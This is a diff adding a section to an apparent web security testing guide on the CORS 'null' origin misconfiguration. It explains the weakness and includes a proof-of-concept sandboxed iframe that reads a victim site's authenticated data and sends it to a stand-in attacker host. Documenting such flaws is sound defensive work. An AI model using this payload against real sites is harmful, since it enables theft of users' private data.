@@ -132,6 +132,44 @@ Content-Type: application/xml
 [Response Body]
 ```
 
+#### Whitelisted Null Origin Value
+
+The `Origin` header may have the value `null` in specific situations, such as requests triggered from a local file, a redirect, or a serialized object. Developers sometimes whitelist the `null` origin to facilitate local development or to support non-web clients.
+
+However, the `null` origin serves as a "wildcard" that can be exploited. An attacker can programmatically generate a request with the origin `null` by using a sandboxed `iframe`.
+
+If the server simply reflects the `null` origin in the response headers, especially with credentials allowed, it creates a vulnerability similar to the generic wildcard.
+
+```http
+HTTP/1.1 200 OK
+[...]
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+Content-Length: 4
+Content-Type: application/xml
+```
+
+In an exploit scenario, an attacker embeds a sandboxed `iframe` on their malicious site. The `sandbox` attribute forces the browser to set the `Origin` of requests initiated from within that frame to `null`. 
+
+```html
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
+    <script>
+        fetch('https://victim.site/sensitive-data', {
+            method: 'GET',
+            credentials: 'include' // Essential for sending cookies/auth headers
+        })
+        .then(response => response.text())
+        .then(data => {
+            // Exfiltrate data to attacker's server
+            location.href = 'https://attacker.server/log?data=' + btoa(data);
+        });
+    </script>">
+</iframe>
+```
+
+Consequently, the browser sees the request coming from `null`, the server allows `null`, and the attacker successfully reads the sensitive response.
+
+
 ### Input Validation Weakness
 
 The CORS concept can be viewed from a completely different angle. An attacker may allow their CORS policy on purpose to inject code to the target web application.
